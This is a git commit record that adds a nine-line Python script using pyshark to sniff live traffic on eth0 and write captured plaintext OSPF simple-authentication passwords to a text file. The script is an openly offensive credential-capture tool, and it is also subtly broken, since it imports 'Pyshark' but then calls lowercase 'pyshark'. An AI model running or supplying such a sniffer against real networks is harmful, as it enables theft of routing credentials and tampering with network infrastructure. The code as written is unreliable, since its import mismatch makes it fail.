0a36b1e3699633be1710f5dc6fc94f1f5fe23265
atillaseyid <atillaseyid87@gmail.com>
2022-04-30 20:30:50 +0200

    ospf password capture script added

---
+++ OSPF-password_capture.py
@@ -0,0 +1,9 @@
+import Pyshark
+
+capture = pyshark.LiveCapture('eth0')
+myfile = open('ospfpassword.txt', 'w')
+
+for packet in capture:
+    if 'OSPF' in packet:
+        ospfpassword = 'OSPF password: ' + packet.ospf.auth_simple
+        myfile.write(str(ospfpassword) + '\n')
